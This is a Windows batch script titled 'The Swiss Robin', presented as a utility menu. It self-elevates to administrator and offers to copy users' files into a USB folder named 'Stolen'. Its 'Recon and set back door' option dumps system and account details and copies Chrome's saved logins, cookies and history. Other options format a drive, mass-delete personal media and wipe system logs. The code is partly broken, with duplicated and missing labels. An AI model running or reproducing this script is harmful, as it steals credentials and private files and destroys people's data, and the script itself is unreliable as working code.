@echo off
title The Swiss Robin.
ECHO =============================
ECHO Running Admin shell
ECHO =============================

:init
setlocal DisableDelayedExpansion
set "batchPath=%~0"
for %%k in (%0) do set batchName=%%~nk
set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
setlocal EnableDelayedExpansion

:checkPrivileges
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
ECHO.
ECHO **************************************
ECHO 
ECHO **************************************

ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
ECHO args = "ELEV " >> "%vbsGetPrivileges%"
ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
ECHO Next >> "%vbsGetPrivileges%"
ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
exit /B

:gotPrivileges
setlocal & pushd .
cd /d %~dp0
if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)


:START
::::::::::::::::::::::::::::
REM Run shell as admin (example) - put here code as you like
CLS
CD /D %~dp0
color 0A
echo                           The Swiss Robin Built by Techiecream
echo.
echo.
echo.                             www.facebook.com/techiecream
echo. 
echo.                                techiecream@gmail.com
echo.
echo.                                   +256715192934
echo.
echo.
@echo off
@echo off
title The Swiss Robin.
echo.
echo Your are running As an Administrator
echo Good Luck
echo.
color 0A
Rundll32.exe User32.dll,LockWorkStation
echo Choose your poison
echo 1) Copy Files
echo 2) Check network
echo 3) Recon and set back door
echo 4) Scan Flash Drive For Viruses
echo 5) Fix a dead flash
echo 6) Set and Reset Proxy
echo 7) Move Music Files
echo 8) Format Drive
echo 9) Speed up and Create Space
echo 11) start Browser
echo 12) Change Language
echo 13) Take Down
echo 14) Download Software
echo 15) Temporary Activate Windows
echo 16) Setup Hotspot
echo 17) Secure Folder
echo 10) Exit
::
::
set/p "cho=>"
if %cho%==1 goto Copy
if %cho%==2 goto Internet
if %cho%==3 goto Recon
if %cho%==4 goto Virus
if %cho%==5 goto flash
if %cho%==6 goto proxy
if %cho%==7 goto organiser
if %cho%==8 goto rogue
if %cho%==9 goto speed
if %cho%==10 goto exit
if %cho%==11 goto firesk
if %cho%==12 goto safefail
if %cho%==13 goto sopelete
if %cho%==14 goto programlist
if %cho%==15 goto Activawin
if %cho%==16 goto hotspot
if %cho%==17 goto secure

echo Invalid choice.
goto start


:exit
echo timing out in 5
timeout 5 >nul
exit
:Copy
::User Input
::Ask for the drive letter
set /P ROOT="Enter drive letter of source disc: "
IF NOT '%ROOT%'=='' SET ROOT=%ROOT:~0,1%
set ROOT=%ROOT%:
echo.
::Get the Usb drive letter
set USB=
set /P USB="Enter drive letter of USB flash drive: "
IF NOT '%USB%'=='' SET USB=%USB:~0,1%
set USB=%USB%:
echo.
echo Make a choice
echo 1) Copy From Windows
echo 2) Copy From Drive
set/p "cho=>"
if %cho%==1 goto Windows
if %cho%==2 goto Drive

:Windows
echo.
echo Make a choice
echo 1) Copy All Files
echo 2) Copy Documents
set/p "cho=>"
if %cho%==1 goto Hole
if %cho%==2 goto Docx
echo Invalid choice.
goto start

:Hole
echo Your have choosen to Copy all files from %ROOT% to %USB%
echo please wait
xcopy /q /s /c /i /y "C:\Users\*.*" "%USB%\Stolen"
xcopy /q /s /c /i /y "C:\Documents and Settings\*.*" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start
:Docx
echo.
echo Your have choosen to Copy Documents from %ROOT% to %USB%
echo please wait
xcopy /q /s /c /i /y "C:\Users\*.doc" "%USB%\Stolen\documents"
xcopy /q /s /c /i /y "C:\Users\*.pdf" "%USB%\Stolen\documents"
xcopy /q /s /c /i /y "C:\Users\*.xls" "%USB%\Stolen\documents"
xcopy /q /s /c /i /y "C:\Users\*.txt" "%USB%\Stolen\documents"
echo Please wait
echo Thank you for your patience
cls
goto start

::Drive
xcopy /q /s /c /i /y "%ROOT%\*.*" "%USB%"

:Drive
echo.
echo Make a choice
echo 1) Copy All Files
echo 2) Copy Documents
echo 3) Copy Music
echo 4) Copy Pictures
echo 5) Copy Videos
set/p "cho=>"
if %cho%==1 goto All
if %cho%==2 goto Document
if %cho%==3 goto Music
if %cho%==4 goto Pictures
echo Invalid choice.
goto start


:Music
echo.
echo Your have choosen to Copy Music files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.mp3" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start

:Pictures
echo.
echo Your have choosen to Copy Pictures files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.bmp" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.gif" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpeg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.png" "%USB%\Stolen\Pictures"
echo Please wait
echo Thank you for your patience
cls
goto start

:Videos
echo.
xcopy /q /s /c /i /y "%ROOT%\*.mp4" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.vob" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.flv" "%USB%\Stolen\Pictures"



:Documents
echo.
echo Your have choosen to Copy Documents from %ROOT% to %USB%
echo please wait
xcopy /q /s /c /i /y "%ROOT%\*.doc" "%USB%\Stolen"
xcopy /q /s /c /i /y "%ROOT%\*.pdf" "%USB%\Stolen"
xcopy /q /s /c /i /y "%ROOT%\*.xls" "%USB%\Stolen"
xcopy /q /s /c /i /y "%ROOT%\*.txt" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start

:Music
echo.
echo Your have choosen to Copy Music files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.mp3" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start

:Pictures
echo.
echo Your have choosen to Copy Pictures files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.bmp" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.gif" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpeg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.png" "%USB%\Stolen\Pictures"
echo Please wait
echo Thank you for your patience
cls
goto start

:Videos
echo.
xcopy /q /s /c /i /y "%ROOT%\*.mp4" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.vob" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.flv" "%USB%\Stolen\Pictures"

echo Set the drive letters for %username%.
echo.
set /p USB="Usb Drive Letter: "
::IF NOT '%USB'==''SET USB=%USB:~0,1%
SET USB=%USB%
SET /p LOCK="Source Drive: "
::IF NOT '%LOCK'==''SET LOCK=%LOCK:~0,1%
SET LOCK=%LOCK%
echo Do you want to backup or copy
echo 1) Backup
echo 2) Copy
SET /p "cho=>"
if %cho%== 1 goto backup
if %cho%== 2 goto copy
:backup
echo how do you want to backup
echo.
echo 1)Backup to USb
echo 2) Backup to Drive
SET /p "bac=>"
if %bac%== 1 goto backusb
if %bac%== 2 goto backdrive
:backusb
xcopy /S /C /V /I /L /Q /H %LOCK%\*.* "%USB%\Backup"
goto start
:backdrive
xcopy /S /C /V /I /L /Q /H %USB%\*.* "%LOCK%\Backup"
goto start

:Internet
Echo checking connection to Zero facebook, please wait.....
ping -n 1 www.google.com | find "reply from " > NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESS
IF ERRORLEVEL 1 GOTO TryAgain
:TryAgain
echo Failure!!
echo let me try abit more, wait
ping -n 3 www.google.com | find "reply from " >NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESS 2
IF ERRORLEVEL 1 GOTO TryIP
:TryIP
echo Failure !!
echo lets try by IP address
ping -n 1 31.13.90.66  | find "reply from " >NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESSDns
IF ERRORLEVEL 1 GOTO TestInternet
:TestInternet
echo Failure !!
echo lets test Internet Connection
ping -n 1 www.google.com  | find "reply from " >NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESS 3
IF ERRORLEVEL 1 GOTO Netdown
:SUCCESS
echo  Your Computer (%Computer name%) is connected to the Network!!
goto End
:SUCCESS 2
echo  Your Computer (%Computername%) is connected to the Network but packet loss was detected!!
goto End
:SUCCESS 3
echo  Your Computer (%Computername%) does have an active Internet connection but your computer is connecting to the internet network.
goto End
:SUCCESSDns
echo  Your Computer (%Computername%)is connected to the internal network but you have DNS issues.
goto End
:Netdown
echo  Your Computer (%Computername%) does not have an active internet connection.
goto End

:End
goto start

:Recon
echo 1)Reconn PC
echo 2)Back Door
echo.
echo.
set/p "recon=>"
if %recon%==1 goto scan
if %recon%==2 goto backdoors
:scan
echo.
set /P TRO="Enter drive letter to scan: "
set TRO=%TRO%:
ECHO %TRO%
set /P Recosb="Enter drive letter to view results: "
set Recosb=%Recosb%:
echo Your have choosen to scan %TRO% for %Recosb%
echo please wait
dir /q /s "%TRO%" >"%Recosb%\Re.txt"
systeminfo >> "%Recosb%\%USERDOMAIN%\_Systeminfo.txt"
ipconfig /all >> "%Recosb%\Ipconfig.txt"
TASKLIST >> "%Recosb%\Tasklist.txt"
WMIC DISKDRIVE >> "%Recosb%\Disk.Drivers.txt"
WMIC VOLUME >> "%Recosb%\Disk.Volume.txt"
WMIC LOGICALDISK LIST >>"%Recosb%\Logical.Disk.txt"
WMIC CPU LIST >> "%Recosb%\Cpu.txt"
WMIC NETPROTOCOL >>"%Recosb%\Net.Protocol.txt"
WMIC SHARE LIST >> "%Recosb%\Share.txt"
WMIC SYSDRIVER >> "%Recosb%\SYS.Drivers.txt"
WMIC GROUP LIST >> "%Recosb%\Group.List.txt"
WMIC SOUNDDEV >> "%Recosb%\Sound.Device.txt"
WMIC SYSTEMSLOT >> "%Recosb%\System.Slots.txt"
WMIC USERACCOUNT LIST >> "%Recosb%\Accounts.txt"
WMIC STARTUP >> "%Recosb%\StartUp.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Desktop >> "%Recosb%\Dir_Desktop.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Desktop /A >> "%Recosb%\Dir_Desktop2.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Documents >> "%Recosb%\Dir_Documents.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Documents /A >> "%Recosb%\Dir_Documents2.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Pictures >> "%Recosb%\Dir_Pictures.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Pictures /A >> "%Recosb%\Dir_Pictures2.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Downloads >> "%Recosb%\Dir_Downloads.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Downloads /A >> "%Recosb%\Dir_Downloads2.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Favorites >> "%Recosb%\Dir_Favorites.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Favorites /A >> "%Recosb%\Dir_Favorites2.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Videos >> "%Recosb%\Dir_Videos.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Videos /A >> "%Recosb%\Dir_Videos2.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Music >> "%Recosb%\Dir_Music.txt"
DIR /Q /S %HOMEDRIVE%\%HOMEPATH%\Contacts >> "%Recosb%\Dir_Contacts.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Contacts /A >> "%Recosb%\Dir_Contacts2.txt"
DIR /Q %HOMEPATH% >> "%Recosb%\Dir_Homepath.txt"
TREE %HOMEPATH% /F >> "%Recosb%\Dir_Homepath2.txt"
TREE %HOMEPATH% /A >> "%Recosb%\Dir_Homepath3.txt"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Login Data-journal" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Cookies-journal" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\History" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Archived History" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Archived History-journal" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\History Provider Cache" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\History-journal" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Last Session" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Last Tabs" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Top Sites" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Top Sites-journal" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\TransportSecurity" "%Recosb%\Google_Chrome"
XCOPY "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Visited Links" "%Recosb%\Google_Chrome"
pause
echo Running bonuses
dir /q /s C:\Users >>%Recosb%\Bonus.txt
echo Please wait
echo Thank you for your patience
pause
cls
goto start
:Virus
@echo off
echo  Removing Shortcuts and suspicous files
ECHO SET DRIVE LETTER
:setdrisc
set /P CHISB="Drive to Scan:"
set CHISB=%CHISB%:
cd %CHISB%
xcopy /q /s /c /i /y "�\*.*" "%CHISB%\Music"
pause
del /s /q "%CHISB%\Skypee"
del /q "%CHISB%\Skypee"
del /s /q "%CHISB%\z"
del /s /q "%CHISB%\Google"
del "%CHISB%\autorun.inf"
del "%CHISB%\*.vbe"
del "%CHISB%\*.lnk"
del "%CHISB%\*.tmp"
del "%CHISB%\*.vbs"
del "%CHISB%\*.tmp"
del "%CHISB%\*.*.exe"
del "%CHISB%\fypuas.exe"
del "%CHISB%\fypuasx.exe"
del "%CHISB%\Microsoft.exe"
del /s /q "%CHISB%\mojih"
pause
cls
echo Removed Shortcuts
echo.
echo  Making your folders visible
echo  This may take few minutes..........
echo  Please wait..........
echo.
echo.
attrib /s /d -s -h -r "%CHISB%\*.*"
echo  Now the folders are visible
goto start
:flash

:proxy
echo 1)Set Proxy
echo 2)Reset Proxy
echo.
echo.
set/p "pro=>"
if %pro%==1 goto setpro
if %pro%==2 goto reset
:setpro
set /P PRON="Proxy name "
set PRON=%PRON%
set /P PROP="Proxy port "
set PROP=%PROP%
echo.
echo.
netsh winhttp set proxy %PRON%:%PROP%
Echo Done
goto start
:reset
netsh winhttp reset proxy
echo Done
goto start
:organiser
@echo off
::xcopy /q /s /c /i /y "C:\users\%username%\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y /l "C:\users\%username%\Desktop\*.3gp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.3gpp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.dat" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.ogg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.flv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.mpg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.mpeg1" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.webm" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.wma" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.wmv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.vob" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.3gp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.3gpp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.ogg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.dat" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.avi" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.flv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mp4" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mpg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mpeg1" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.webm" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.wma" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.wmv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.vob" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.3gp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.3gpp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.ogg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Picutres\*.dat" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.avi" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.flv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.mp4" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.mpeg1" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.webm" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.wma" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.wmv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.vob" "C:\users\%username%\Music"
goto start

:rogue
echo You are a bad person
echo Is someone after you or you are after someone
echo You may choice to format or just deny access to the Computer
echo We will go rouge in 5 seconds
timeout 5
set /P FDRIV="Set Drive to Format:"
set FDRIV=%FDRIV%:
format "%FDRIV%" /q /x /FS:NTFS /V:STEITH 
goto start

:speed
@echo off
del /s /f /q "C:\Users\%username%\Links\*.*"
del /s /f /q c:\windows\temp\*.*
rmdir /s /q c:\windows\temp
md c:\windows\temp
rmdir /s /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
del C:\WINDOWS\Temp\*.*
del C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\*.tmp
del C:\WINDOWS\Prefetch\*.pf
del C:\Documents and Settings\Administrator\Recent\*.*
del C:\Documents and Settings\Administrator\Cookies\*.*
del /s /q /f "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.*"
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*
del /s /q C:\users\%username%\AppData\Local\Temp\*.*
del /s /q C:\users\%username%\AppData\Roaming\Microsoft\Office\Recent\*.*
del /s /q /f "C:\Windows\PFRO.log"
del /s /q /f "C:\Windows\setupact.log"
del /s /q /f "C:\Windows\setuperr.log"
del /s /q /f "C:\Windows\WindowsUpdate.log"
del /s /q /f "C:\Windows\SoftwareDistribution\ReportingEvents.log"
del /s /q /f "C:\Windows\Logs\CBS\CBS.log"
del /s /q /f "C:\Windows\Logs\DISM\dism.log"
del /s /q /f "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\MpCmdRun.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\Windows\WindowsUpdate.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\Windows\WebCache\V0100019.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\Windows\WebCache\V01tmp.log"
del /s /q /f "C:\Windows\inf\setupapi.dev.log"
del /s /q /f "C:\Windows\Performance\WinSAT\winsat.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\AutoPico.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\DeviceSetup.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\GenericSetup.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\hpPE.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\KMSELDI.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\NGenTask.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\powershell.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\sdiagnhost.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\HP-DQEX5.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\HPScan.exe.log"
del /s /q /f "C:\Users\USER\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\NGenTask.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\NGenTask.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\taskhost.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\taskhostex.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\tzsync.exe.log"
del /s /q /f "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\NGenTask.exe.log"	
del /s /q C:\users\%username%\AppData\Roaming\vlc\art\*.*
::[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
::[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
::[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
::[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
::[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit]

::[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
::[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
::[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
::[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
::[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]
echo Your Computer is Clean and Faster
pause
cls
goto start 
:firesk
start firefox.exe
goto start
:safefail
echo edit this part to fix chinese laptops
echo download the apporiate language-locale for your device
echo set the download path
echo wait
DISM /Online /Add-Package /PackagePath:C:\lp\lp.cab
bcdedit /set {current} locale en-US
bcdboot %WinDir% /l en-US
DISM /Online /Get-Packages > C:\pack.txt
DISM /Online /Remove-Package /PackageName:Microsoft-Windows-Client-LanguagePack-Package~31bf3856ad364e35~amd64~zh-CN~6.1.7601.17514
REG ADD REM HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MUI\UILanguages \t
ECHO delete the folders that have language-locale codes different from the ones you need. 
ECHO For example ru-RU or es-ES.
pause
goto start
@echo off
Title Computer Sound Poison
color 0C
echo you are about to loss all your music and vidoes
pause
:sopelete
del /s /q "C:\users\%username%\Desktop\*.3gp"
del /s /q "C:\users\%username%\Desktop\*.3gpp"
del /s /q "C:\users\%username%\Desktop\*.dat"
del /s /q "C:\users\%username%\Desktop\*.ogg"
del /s /q "C:\users\%username%\Desktop\*.flv"
del /s /q "C:\users\%username%\Desktop\*.jpeg"
del /s /q "C:\users\%username%\Desktop\*.jpg"
del /s /q "C:\users\%username%\Desktop\*.mp3"
del /s /q "C:\users\%username%\Desktop\*.mpg"
del /s /q "C:\users\%username%\Desktop\*.mpeg1"
del /s /q "C:\users\%username%\Desktop\*.webm"
del /s /q "C:\users\%username%\Desktop\*.wma"
del /s /q "C:\users\%username%\Desktop\*.wmv"
del /s /q "C:\users\%username%\Desktop\*.vob"
del /q /A:H "C:\users\%username%\Documents"
del /s /q "C:\users\%username%\Documents\*.3gp"
del /s /q "C:\users\%username%\Documents\*.3gpp"
del /s /q "C:\users\%username%\Documents\*.ogg"
del /s /q "C:\users\%username%\Documents\*.dat"
del /s /q "C:\users\%username%\Documents\*.avi"
del /s /q "C:\users\%username%\Documents\*.flv"
del /s /q "C:\users\%username%\Documents\*.jpeg"
del /s /q "C:\users\%username%\Documents\*.jpg"
del /s /q "C:\users\%username%\Documents\*.mp4"
del /s /q "C:\users\%username%\Documents\*.mp3"
del /s /q "C:\users\%username%\Documents\*.mpg"
del /s /q "C:\users\%username%\Documents\*.mpeg1"
del /s /q "C:\users\%username%\Documents\*.webm"
del /s /q "C:\users\%username%\Documents\*.wma"
del /s /q "C:\users\%username%\Documents\*.wmv"
del /s /q "C:\users\%username%\Documents\*.vob"
del /s /q "C:\users\%username%\Music\*.3gp"
del /s /q "C:\users\%username%\Music\*.3gpp"
del /s /q "C:\users\%username%\Music\*.ogg"
del /s /q "C:\users\%username%\Music\*.dat"
del /s /q "C:\users\%username%\Music\*.avi"
del /s /q "C:\users\%username%\Music\*.flv"
del /s /q "C:\users\%username%\Music\*.jpeg"
del /s /q "C:\users\%username%\Music\*.jpg"
del /s /q "C:\users\%username%\Music\*.mp4"
del /s /q "C:\users\%username%\Music\*.mp3"
del /s /q "C:\users\%username%\Music\*.mpg"
del /s /q "C:\users\%username%\Music\*.mpeg1"
del /s /q "C:\users\%username%\Music\*.webm"
del /s /q "C:\users\%username%\Music\*.wma"
del /s /q "C:\users\%username%\Music\*.wmv"
del /s /q "C:\users\%username%\Music\*.vob"
del /s /q "C:\users\%username%\Pictures\*.3gp"
del /s /q "C:\users\%username%\Pictures\*.3gpp"
del /s /q "C:\users\%username%\Pictures\*.ogg"
del /s /q "C:\users\%username%\Picutres\*.dat"
del /s /q "C:\users\%username%\Pictures\*.avi"
del /s /q "C:\users\%username%\Pictures\*.flv"
del /s /q "C:\users\%username%\Pictures\*.jpeg"
del /s /q "C:\users\%username%\Pictures\*.jpg"
del /s /q "C:\users\%username%\Pictures\*.mp4"
del /s /q "C:\users\%username%\Pictures\*.mp3"
del /s /q "C:\users\%username%\Pictures\*.mpeg1"
del /s /q "C:\users\%username%\Pictures\*.webm"
del /s /q "C:\users\%username%\Pictures\*.wma"
del /s /q "C:\users\%username%\Pictures\*.wmv"
del /s /q "C:\users\%username%\Pictures\*.vob"
del /s /q "C:\Users\%username%\AppData\Local\Temp\*.*"
echo well done you have just deleted all the music and videos from your computer
goto start

:secure
SET CPSD=shield 
CLS 
:StartLock 
IF EXIST "SHIELD" GOTO HIDE 
IF EXIST "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" GOTO SHOW 
GOTO SHIELD 

:HIDE 
CLS 
CHOICE /C YN /M "Are you sure you want to lock the folder?" 
IF /I %ERRORLEVEL% EQU 2 EXIT 
REN "SHIELD" "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" 
ATTRIB /S /D "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" +H +S 
CLS 
ECHO Folder locked successfully! 
PAUSE>NUL 
EXIT 

